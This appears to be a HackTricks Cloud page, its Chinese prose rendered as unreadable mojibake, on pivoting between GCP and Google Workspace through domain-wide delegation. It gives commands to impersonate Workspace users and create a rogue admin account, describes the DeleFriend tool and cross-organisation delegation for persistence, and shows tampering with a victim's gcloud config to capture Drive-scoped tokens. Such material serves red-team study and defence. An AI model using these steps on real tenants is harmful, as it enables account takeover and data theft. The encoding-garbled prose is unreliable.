# GCP <--> Workspace Pivoting

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **ä» GCP åˆ° GWS**

### **åŸŸèŒƒå›´å§”æ´¾åŸºç¡€**

Google Workspace çš„åŸŸèŒƒå›´å§”æ´¾å…è®¸èº«ä»½å¯¹è±¡ï¼Œæ— è®ºæ˜¯æ¥è‡ª Google Workspace å¸‚åœºçš„ **å¤–éƒ¨åº”ç”¨** è¿˜æ˜¯å†…éƒ¨çš„ **GCP æœåŠ¡è´¦æˆ·**ï¼Œ**ä»£è¡¨ç”¨æˆ·è®¿é—® Workspace ä¸­çš„æ•°æ®**ã€‚

{% hint style="info" %}
è¿™åŸºæœ¬ä¸Šæ„å‘³ç€ **GCP é¡¹ç›®** ä¸­çš„ **æœåŠ¡è´¦æˆ·** å¯èƒ½èƒ½å¤Ÿ **å†’å……åŒä¸€ç»„ç»‡çš„ Workspace ç”¨æˆ·**ï¼ˆç”šè‡³æ˜¯æ¥è‡ªä¸åŒç»„ç»‡çš„ç”¨æˆ·ï¼‰ã€‚
{% endhint %}

æœ‰å…³æ­¤å¦‚ä½•å…·ä½“å·¥ä½œçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="gcp-understanding-domain-wide-delegation.md" %}
[gcp-understanding-domain-wide-delegation.md](gcp-understanding-domain-wide-delegation.md)
{% endcontent-ref %}

### ç ´åç°æœ‰å§”æ´¾

å¦‚æœæ”»å‡»è€… **è·å¾—äº†å¯¹ GCP çš„æŸäº›è®¿é—®æƒé™** å¹¶ä¸” **çŸ¥é“å…¬å¸ä¸€ä¸ªæœ‰æ•ˆçš„ Workspace ç”¨æˆ·é‚®ç®±**ï¼ˆæœ€å¥½æ˜¯ **è¶…çº§ç®¡ç†å‘˜**ï¼‰ï¼Œä»–å¯ä»¥ **æšä¸¾ä»–æœ‰è®¿é—®æƒé™çš„æ‰€æœ‰é¡¹ç›®**ï¼Œ**æšä¸¾é¡¹ç›®çš„æ‰€æœ‰æœåŠ¡è´¦æˆ·**ï¼Œæ£€æŸ¥ä»– **å¯ä»¥è®¿é—®çš„æœåŠ¡è´¦æˆ·**ï¼Œå¹¶ **å¯¹æ¯ä¸ªä»–å¯ä»¥å†’å……çš„æœåŠ¡è´¦æˆ·é‡å¤** æ‰€æœ‰è¿™äº›æ­¥éª¤ã€‚\
é€šè¿‡ **ä»–æœ‰è®¿é—®æƒé™çš„æ‰€æœ‰æœåŠ¡è´¦æˆ·çš„åˆ—è¡¨** å’Œ **Workspace** **é‚®ç®±çš„åˆ—è¡¨**ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯• **ç”¨æ¯ä¸ªæœåŠ¡è´¦æˆ·å†’å……ç”¨æˆ·**ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œåœ¨é…ç½®åŸŸèŒƒå›´å§”æ´¾æ—¶ä¸éœ€è¦ä»»ä½• Workspace ç”¨æˆ·ï¼Œå› æ­¤åªéœ€çŸ¥é“ **ä¸€ä¸ªæœ‰æ•ˆçš„ç”¨æˆ·å°±è¶³å¤Ÿå¹¶ä¸”æ˜¯å†’å……æ‰€éœ€çš„**ã€‚\
ç„¶è€Œï¼Œ**å°†ä½¿ç”¨è¢«å†’å……ç”¨æˆ·çš„æƒé™**ï¼Œå› æ­¤å¦‚æœæ˜¯è¶…çº§ç®¡ç†å‘˜ï¼Œæ‚¨å°†èƒ½å¤Ÿè®¿é—®æ‰€æœ‰å†…å®¹ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•è®¿é—®æƒé™ï¼Œè¿™å°†æ¯«æ— ç”¨å¤„ã€‚
{% endhint %}

#### [GCP ç”Ÿæˆå§”æ´¾ä»¤ç‰Œ](https://github.com/carlospolop/gcp\_gen\_delegation\_token)

è¿™ä¸ªç®€å•çš„è„šæœ¬å°† **ç”Ÿæˆä¸€ä¸ªä½œä¸ºè¢«å§”æ´¾ç”¨æˆ·çš„ OAuth ä»¤ç‰Œ**ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥è®¿é—®å…¶ä»– Google APIï¼Œæ— è®ºæ˜¯å¦ä½¿ç”¨ `gcloud`ï¼š
```bash
# Impersonate indicated user
python3 gen_delegation_token.py --user-email <user-email> --key-file <path-to-key-file>

# Impersonate indicated user and add additional scopes
python3 gen_delegation_token.py --user-email <user-email> --key-file <path-to-key-file> --scopes "https://www.googleapis.com/auth/userinfo.email, https://www.googleapis.com/auth/cloud-platform, https://www.googleapis.com/auth/admin.directory.group, https://www.googleapis.com/auth/admin.directory.user, https://www.googleapis.com/auth/admin.directory.domain, https://mail.google.com/, https://www.googleapis.com/auth/drive, openid"
```
#### [**DeleFriend**](https://github.com/axon-git/DeleFriend)

è¿™æ˜¯ä¸€ä¸ªå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ­¥éª¤çš„å·¥å…·ï¼š

1. **ä½¿ç”¨èµ„æºç®¡ç†å™¨ API æšä¸¾ GCP é¡¹ç›®**ã€‚
2. è¿­ä»£æ¯ä¸ªé¡¹ç›®èµ„æºï¼Œå¹¶ä½¿ç”¨ _GetIAMPolicy_ **æšä¸¾ GCP æœåŠ¡è´¦æˆ·èµ„æº**ï¼Œä»¥ç¡®å®šåˆå§‹ IAM ç”¨æˆ·å¯ä»¥è®¿é—®çš„èµ„æºã€‚
3. è¿­ä»£ **æ¯ä¸ªæœåŠ¡è´¦æˆ·è§’è‰²**ï¼Œå¹¶æŸ¥æ‰¾åœ¨ç›®æ ‡æœåŠ¡è´¦æˆ·èµ„æºä¸Šå…·æœ‰ _**serviceAccountKeys.create**_ æƒé™çš„å†…ç½®ã€åŸºæœ¬å’Œè‡ªå®šä¹‰è§’è‰²ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¼–è¾‘è€…è§’è‰²æœ¬èº«å°±æ‹¥æœ‰æ­¤æƒé™ã€‚
4. ä¸ºåœ¨ IAM ç­–ç•¥ä¸­æ‰¾åˆ°ç›¸å…³æƒé™çš„æ¯ä¸ªæœåŠ¡è´¦æˆ·èµ„æºåˆ›å»ºä¸€ä¸ª **æ–°çš„ `KEY_ALG_RSA_2048`** ç§é’¥ã€‚
5. è¿­ä»£ **æ¯ä¸ªæ–°æœåŠ¡è´¦æˆ·å¹¶ä¸ºå…¶åˆ›å»ºä¸€ä¸ª `JWT`** **å¯¹è±¡**ï¼Œè¯¥å¯¹è±¡ç”± SA ç§é’¥å‡­æ®å’Œ OAuth èŒƒå›´ç»„æˆã€‚åˆ›å»ºæ–° _JWT_ å¯¹è±¡çš„è¿‡ç¨‹å°† **è¿­ä»£æ‰€æœ‰ç°æœ‰çš„ OAuth èŒƒå›´ç»„åˆ**ï¼Œä»¥æŸ¥æ‰¾æ‰€æœ‰çš„å§”æ‰˜å¯èƒ½æ€§ã€‚åˆ—è¡¨ **oauth\_scopes.txt** æ›´æ–°äº†æˆ‘ä»¬å‘ç°çš„æ‰€æœ‰ä¸æ»¥ç”¨ Workspace èº«ä»½ç›¸å…³çš„ OAuth èŒƒå›´ã€‚
6. `_make_authorization_grant_assertion` æ–¹æ³•æ­ç¤ºäº†å£°æ˜ä¸€ä¸ª **ç›®æ ‡å·¥ä½œåŒºç”¨æˆ·**ï¼ˆç§°ä¸º _subject_ï¼‰ä»¥åœ¨ DWD ä¸‹ç”Ÿæˆ JWT çš„å¿…è¦æ€§ã€‚è™½ç„¶è¿™ä¼¼ä¹éœ€è¦ä¸€ä¸ªç‰¹å®šç”¨æˆ·ï¼Œä½†é‡è¦çš„æ˜¯è¦æ„è¯†åˆ° **DWD å½±å“åŸŸå†…çš„æ¯ä¸ªèº«ä»½**ã€‚å› æ­¤ï¼Œä¸º **ä»»ä½•åŸŸç”¨æˆ·** åˆ›å»º JWT ä¼šå½±å“è¯¥åŸŸä¸­çš„æ‰€æœ‰èº«ä»½ï¼Œè¿™ä¸æˆ‘ä»¬çš„ç»„åˆæšä¸¾æ£€æŸ¥ä¸€è‡´ã€‚ç®€å•æ¥è¯´ï¼Œä¸€ä¸ªæœ‰æ•ˆçš„ Workspace ç”¨æˆ·å°±è¶³å¤Ÿç»§ç»­å‰è¿›ã€‚\
è¯¥ç”¨æˆ·å¯ä»¥åœ¨ DeleFriend çš„ _config.yaml_ æ–‡ä»¶ä¸­å®šä¹‰ã€‚å¦‚æœç›®æ ‡å·¥ä½œåŒºç”¨æˆ·å°šä¸æ˜ç¡®ï¼Œè¯¥å·¥å…·é€šè¿‡æ‰«æåœ¨ GCP é¡¹ç›®ä¸Šå…·æœ‰è§’è‰²çš„åŸŸç”¨æˆ·æ¥è‡ªåŠ¨è¯†åˆ«æœ‰æ•ˆçš„å·¥ä½œåŒºç”¨æˆ·ã€‚éœ€è¦å†æ¬¡æ³¨æ„çš„æ˜¯ï¼ŒJWT æ˜¯ç‰¹å®šäºåŸŸçš„ï¼Œå¹¶ä¸æ˜¯ä¸ºæ¯ä¸ªç”¨æˆ·ç”Ÿæˆçš„ï¼›å› æ­¤ï¼Œè‡ªåŠ¨è¿‡ç¨‹é’ˆå¯¹æ¯ä¸ªåŸŸçš„å•ä¸€å”¯ä¸€èº«ä»½ã€‚
7. **æšä¸¾å¹¶ä¸ºæ¯ä¸ª JWT åˆ›å»ºä¸€ä¸ªæ–°çš„æ‰¿è½½è®¿é—®ä»¤ç‰Œ**ï¼Œå¹¶é€šè¿‡ tokeninfo API éªŒè¯è¯¥ä»¤ç‰Œã€‚

#### [Gitlab çš„ Python è„šæœ¬](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp\_misc/-/blob/master/gcp\_delegation.py)

Gitlab åˆ›å»ºäº† [è¿™ä¸ª Python è„šæœ¬](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py)ï¼Œå¯ä»¥åšä¸¤ä»¶äº‹ - åˆ—å‡ºç”¨æˆ·ç›®å½•å¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†è´¦æˆ·ï¼ŒåŒæ—¶æŒ‡æ˜ä¸€ä¸ªåŒ…å« SA å‡­æ®å’Œè¦æ¨¡æ‹Ÿçš„ç”¨æˆ·çš„ jsonã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨æ–¹æ³•ï¼š
```bash
# Install requirements
pip install --upgrade --user oauth2client

# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
### åˆ›å»ºæ–°çš„å§”æ‰˜ï¼ˆæŒä¹…æ€§ï¼‰

å¯ä»¥åœ¨ [**https://admin.google.com/u/1/ac/owl/domainwidedelegation**](https://admin.google.com/u/1/ac/owl/domainwidedelegation)** ä¸­** **æ£€æŸ¥åŸŸèŒƒå›´å§”æ‰˜**ã€‚

å…·æœ‰ **åœ¨ GCP é¡¹ç›®ä¸­åˆ›å»ºæœåŠ¡å¸æˆ·çš„èƒ½åŠ›** å’Œ **GWS çš„è¶…çº§ç®¡ç†å‘˜æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„å§”æ‰˜ï¼Œå…è®¸æœåŠ¡å¸æˆ·æ¨¡æ‹ŸæŸäº› GWS ç”¨æˆ·ï¼š**

1. **ç”Ÿæˆæ–°çš„æœåŠ¡å¸æˆ·åŠç›¸åº”çš„å¯†é’¥å¯¹ï¼š** åœ¨ GCP ä¸Šï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶å°äº¤äº’å¼åœ°æˆ–ä½¿ç”¨ç›´æ¥ API è°ƒç”¨å’Œ CLI å·¥å…·ä»¥ç¼–ç¨‹æ–¹å¼ç”Ÿæˆæ–°çš„æœåŠ¡å¸æˆ·èµ„æºã€‚è¿™éœ€è¦ **è§’è‰² `iam.serviceAccountAdmin`** æˆ–ä»»ä½•é…å¤‡ **`iam.serviceAccounts.create`** **æƒé™** çš„è‡ªå®šä¹‰è§’è‰²ã€‚æœåŠ¡å¸æˆ·åˆ›å»ºåï¼Œæˆ‘ä»¬å°†ç»§ç»­ç”Ÿæˆ **ç›¸å…³çš„å¯†é’¥å¯¹**ï¼ˆ**`iam.serviceAccountKeys.create`** æƒé™ï¼‰ã€‚
2. **åˆ›å»ºæ–°çš„å§”æ‰˜ï¼š** é‡è¦çš„æ˜¯è¦ç†è§£ï¼Œ**åªæœ‰è¶…çº§ç®¡ç†å‘˜è§’è‰²å…·å¤‡åœ¨ Google Workspace ä¸­è®¾ç½®å…¨å±€åŸŸèŒƒå›´å§”æ‰˜çš„èƒ½åŠ›**ï¼Œè€ŒåŸŸèŒƒå›´å§”æ‰˜ **ä¸èƒ½ä»¥ç¼–ç¨‹æ–¹å¼è®¾ç½®ï¼Œ** åªèƒ½é€šè¿‡ Google Workspace **æ§åˆ¶å°** æ‰‹åŠ¨åˆ›å»ºå’Œè°ƒæ•´ã€‚
* è§„åˆ™çš„åˆ›å»ºå¯ä»¥åœ¨é¡µé¢ **API æ§åˆ¶ â†’ åœ¨ Google Workspace ç®¡ç†æ§åˆ¶å°ä¸­ç®¡ç†åŸŸèŒƒå›´å§”æ‰˜** ä¸‹æ‰¾åˆ°ã€‚
3. **é™„åŠ  OAuth èŒƒå›´æƒé™ï¼š** åœ¨é…ç½®æ–°çš„å§”æ‰˜æ—¶ï¼ŒGoogle åªéœ€è¦ 2 ä¸ªå‚æ•°ï¼Œå®¢æˆ·ç«¯ IDï¼Œå³ **GCP æœåŠ¡å¸æˆ·** èµ„æºçš„ **OAuth ID**ï¼Œä»¥åŠå®šä¹‰å§”æ‰˜æ‰€éœ€ API è°ƒç”¨çš„ **OAuth èŒƒå›´**ã€‚
* **å®Œæ•´çš„ OAuth èŒƒå›´åˆ—è¡¨** å¯ä»¥åœ¨ [**è¿™é‡Œ**](https://developers.google.com/identity/protocols/oauth2/scopes) æ‰¾åˆ°ï¼Œä½†è¿™é‡Œæœ‰ä¸€ä¸ªæ¨èï¼š`https://www.googleapis.com/auth/userinfo.email, https://www.googleapis.com/auth/cloud-platform, https://www.googleapis.com/auth/admin.directory.group, https://www.googleapis.com/auth/admin.directory.user, https://www.googleapis.com/auth/admin.directory.domain, https://mail.google.com/, https://www.googleapis.com/auth/drive, openid`
4. **ä»£è¡¨ç›®æ ‡èº«ä»½è¿›è¡Œæ“ä½œï¼š** æ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨ GWS ä¸­æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å§”æ‰˜å¯¹è±¡ã€‚ç°åœ¨ï¼Œ**ä½¿ç”¨ GCP æœåŠ¡å¸æˆ·ç§é’¥ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ API è°ƒç”¨**ï¼ˆåœ¨ OAuth èŒƒå›´å‚æ•°ä¸­å®šä¹‰çš„èŒƒå›´å†…ï¼‰æ¥è§¦å‘å®ƒå¹¶ **ä»£è¡¨ Google Workspace ä¸­å­˜åœ¨çš„ä»»ä½•èº«ä»½è¿›è¡Œæ“ä½œ**ã€‚æ­£å¦‚æˆ‘ä»¬æ‰€äº†è§£åˆ°çš„ï¼ŒæœåŠ¡å¸æˆ·å°†æ ¹æ®å…¶éœ€æ±‚å’Œå¯¹ REST API åº”ç”¨ç¨‹åºçš„æƒé™ç”Ÿæˆè®¿é—®ä»¤ç‰Œã€‚
* è¯·æŸ¥çœ‹ **ä¸Šä¸€éƒ¨åˆ†** ä»¥è·å–ä¸€äº› **ä½¿ç”¨æ­¤å§”æ‰˜çš„å·¥å…·**ã€‚

#### è·¨ç»„ç»‡å§”æ‰˜

OAuth SA ID æ˜¯å…¨å±€çš„ï¼Œå¯ä»¥ç”¨äº **è·¨ç»„ç»‡å§”æ‰˜**ã€‚æ²¡æœ‰å®æ–½ä»»ä½•é™åˆ¶æ¥é˜²æ­¢è·¨å…¨çƒå§”æ‰˜ã€‚ç®€å•æ¥è¯´ï¼Œ**æ¥è‡ªä¸åŒ GCP ç»„ç»‡çš„æœåŠ¡å¸æˆ·å¯ä»¥ç”¨äºåœ¨å…¶ä»– Workspace ç»„ç»‡ä¸Šé…ç½®åŸŸèŒƒå›´å§”æ‰˜**ã€‚è¿™å°†å¯¼è‡´ **åªéœ€è¦å¯¹ Workspace çš„è¶…çº§ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œè€Œä¸éœ€è¦è®¿é—®ç›¸åŒçš„ GCP è´¦æˆ·ï¼Œå› ä¸ºå¯¹æ‰‹å¯ä»¥åœ¨å…¶ä¸ªäººæ§åˆ¶çš„ GCP è´¦æˆ·ä¸Šåˆ›å»ºæœåŠ¡å¸æˆ·å’Œç§é’¥**ã€‚

### åˆ›å»ºé¡¹ç›®ä»¥æšä¸¾ Workspace

é»˜è®¤æƒ…å†µä¸‹ï¼ŒWorkspace **ç”¨æˆ·** å…·æœ‰ **åˆ›å»ºæ–°é¡¹ç›®** çš„æƒé™ï¼Œå½“åˆ›å»ºæ–°é¡¹ç›®æ—¶ï¼Œ**åˆ›å»ºè€…è·å¾—å¯¹å…¶çš„æ‰€æœ‰è€…è§’è‰²**ã€‚

å› æ­¤ï¼Œç”¨æˆ·å¯ä»¥ **åˆ›å»ºä¸€ä¸ªé¡¹ç›®**ï¼Œ**å¯ç”¨** **API** ä»¥åœ¨å…¶æ–°é¡¹ç›®ä¸­æšä¸¾ Workspaceï¼Œå¹¶å°è¯• **æšä¸¾** å®ƒã€‚

{% hint style="danger" %}
ä¸ºäº†ä½¿ç”¨æˆ·èƒ½å¤Ÿæšä¸¾ Workspaceï¼Œä»–è¿˜éœ€è¦è¶³å¤Ÿçš„ Workspace æƒé™ï¼ˆå¹¶éæ¯ä¸ªç”¨æˆ·éƒ½èƒ½æšä¸¾ç›®å½•ï¼‰ã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
# Create project
gcloud projects create <uniq-projec-name> --name=proj-name
# Set project
gcloud config set project <uniq-projec-name>
# Enable svcs
gcloud services enable admin.googleapis.com
gcloud services enable cloudidentity.googleapis.com
# Get org ID
gcloud organizations list
# Get currents email user groups (at least you can check the groups and members of the groups you belong to)
gcloud identity groups memberships search-transitive-groups --member-email <email> --labels=cloudidentity.googleapis.com/groups.discussion_forum
gcloud identity groups memberships list --group-email=g<group-email>

# FROM HERE THE USER NEEDS TO HAVE ENOUGH WORKSPACE ACCESS
gcloud beta identity groups preview --customer <org-cust-id>
```
{% endcode %}

æ£€æŸ¥**æ›´å¤šæšä¸¾ä¿¡æ¯**ï¼š

{% content-ref url="../gcp-services/gcp-iam-and-org-policies-enum.md" %}
[gcp-iam-and-org-policies-enum.md](../gcp-services/gcp-iam-and-org-policies-enum.md)
{% endcontent-ref %}

### æ»¥ç”¨ Gcloud å‡­è¯

æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°æœ‰å…³ `gcloud` ç™»å½•æµç¨‹çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../gcp-persistence/gcp-non-svc-persistance.md" %}
[gcp-non-svc-persistance.md](../gcp-persistence/gcp-non-svc-persistance.md)
{% endcontent-ref %}

æ­£å¦‚é‚£é‡Œæ‰€è§£é‡Šçš„ï¼Œgcloud å¯ä»¥è¯·æ±‚èŒƒå›´ **`https://www.googleapis.com/auth/drive`**ï¼Œè¿™å°†å…è®¸ç”¨æˆ·è®¿é—®è¯¥ç”¨æˆ·çš„é©±åŠ¨å™¨ã€‚\
ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæ‚¨**ç‰©ç†ä¸Š**å…¥ä¾µäº†ç”¨æˆ·çš„è®¡ç®—æœºï¼Œå¹¶ä¸”**ç”¨æˆ·ä»ç„¶ç™»å½•**å…¶å¸æˆ·ï¼Œæ‚¨å¯ä»¥é€šè¿‡ç”Ÿæˆä¸€ä¸ªè®¿é—®é©±åŠ¨å™¨çš„ä»¤ç‰Œæ¥ç™»å½•ï¼š
```bash
gcloud auth login --enable-gdrive-access
```
å¦‚æœæ”»å‡»è€…å…¥ä¾µäº†ç”¨æˆ·çš„è®¡ç®—æœºï¼Œä»–è¿˜å¯ä»¥ä¿®æ”¹æ–‡ä»¶ `google-cloud-sdk/lib/googlecloudsdk/core/config.py`ï¼Œå¹¶åœ¨ **`CLOUDSDK_SCOPES`** ä¸­æ·»åŠ èŒƒå›´ **`'https://www.googleapis.com/auth/drive'`**ï¼š

<figure><img src="../../../.gitbook/assets/image (342).png" alt="" width="563"><figcaption></figcaption></figure>

{% hint style="warning" %}
å› æ­¤ï¼Œä¸‹æ¬¡ç”¨æˆ·ç™»å½•æ—¶ï¼Œä»–å°†åˆ›å»ºä¸€ä¸ª **å…·æœ‰è®¿é—® drive çš„ä»¤ç‰Œ**ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥ä»¤ç‰Œè®¿é—® driveã€‚æ˜¾ç„¶ï¼Œæµè§ˆå™¨ä¼šæŒ‡ç¤ºç”Ÿæˆçš„ä»¤ç‰Œå°†å…·æœ‰è®¿é—® drive çš„æƒé™ï¼Œä½†ç”±äºç”¨æˆ·ä¼šè‡ªå·±è°ƒç”¨ **`gcloud auth login`**ï¼Œä»–å¯èƒ½ **ä¸ä¼šæ€€ç–‘ä»»ä½•äº‹æƒ…ã€‚**

è¦åˆ—å‡º drive æ–‡ä»¶ï¼š **`curl -H "Authorization: Bearer $(gcloud auth print-access-token)" "https://www.googleapis.com/drive/v3/files"`**
{% endhint %}

## ä» GWS åˆ° GCP

### è®¿é—®ç‰¹æƒ GCP ç”¨æˆ·

å¦‚æœæ”»å‡»è€…å®Œå…¨è®¿é—® GWSï¼Œä»–å°†èƒ½å¤Ÿè®¿é—®å…·æœ‰ GCP ç‰¹æƒè®¿é—®æƒé™çš„ç»„æˆ–ç”¨æˆ·ï¼Œå› æ­¤ä» GWS è½¬ç§»åˆ° GCP é€šå¸¸æ›´â€œç®€å•â€ï¼Œå› ä¸º **GWS ä¸­çš„ç”¨æˆ·å¯¹ GCP å…·æœ‰é«˜æƒé™**ã€‚

### Google Groups æƒé™æå‡

é»˜è®¤æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥ **è‡ªç”±åŠ å…¥ç»„ç»‡çš„ Workspace ç»„**ï¼Œè¿™äº›ç»„ **å¯èƒ½å…·æœ‰ GCP æƒé™**ï¼ˆåœ¨ [https://groups.google.com/](https://groups.google.com/) ä¸­æ£€æŸ¥æ‚¨çš„ç»„ï¼‰ã€‚

é€šè¿‡æ»¥ç”¨ **google groups privesc**ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿæå‡åˆ°å…·æœ‰æŸç§ GCP ç‰¹æƒè®¿é—®æƒé™çš„ç»„ã€‚

### å‚è€ƒ

* [https://www.hunters.security/en/blog/delefriend-a-newly-discovered-design-flaw-in-domain-wide-delegation-could-leave-google-workspace-vulnerable-for-takeover](https://www.hunters.security/en/blog/delefriend-a-newly-discovered-design-flaw-in-domain-wide-delegation-could-leave-google-workspace-vulnerable-for-takeover)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
